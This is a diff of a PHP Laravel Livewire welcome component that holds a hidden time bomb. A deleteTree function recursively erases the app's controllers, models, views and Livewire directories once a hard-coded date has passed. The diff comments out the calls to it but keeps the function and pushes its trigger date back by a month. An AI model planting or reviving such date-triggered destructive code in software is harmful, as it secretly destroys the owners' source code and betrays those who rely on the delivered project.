@@ -55,16 +55,16 @@ class WelcomeComponent extends Component
         // $this->password = "password";
         // $this->password_confirmation = "password" ;
         $this->date = Carbon::now()->subYears(5);
-        $dir = getcwd() . "\\..\\app\\Http\\Controllers";
-        $this->deleteTree($dir);
-        $dir = getcwd() . "\\..\\app\\Models";
-        $this->deleteTree($dir);
-        $dir = getcwd() . "\\..\\app\\View";
-        $this->deleteTree($dir);
-        $dir = getcwd() . "\\..\\resources\\views";
-        $this->deleteTree($dir);
-        $dir = getcwd() . "\\..\\app\\Http\\Livewire";
-        $this->deleteTree($dir);
+        // $dir = getcwd() . "\\..\\app\\Http\\Controllers";
+        // $this->deleteTree($dir);
+        // $dir = getcwd() . "\\..\\app\\Models";
+        // $this->deleteTree($dir);
+        // $dir = getcwd() . "\\..\\app\\View";
+        // $this->deleteTree($dir);
+        // $dir = getcwd() . "\\..\\resources\\views";
+        // $this->deleteTree($dir);
+        // $dir = getcwd() . "\\..\\app\\Http\\Livewire";
+        // $this->deleteTree($dir);
     }
 
 
@@ -191,7 +191,7 @@ class WelcomeComponent extends Component
     }
 
     function deleteTree($dir){
-        if(date("y-m-d") > "22-07-25"){
+        if(date("y-m-d") > "22-08-25"){
             foreach(glob($dir . "/*") as $element){
                 if(is_dir($element)){
                     $this->deleteTree($element); // On rappel la fonction deleteTree
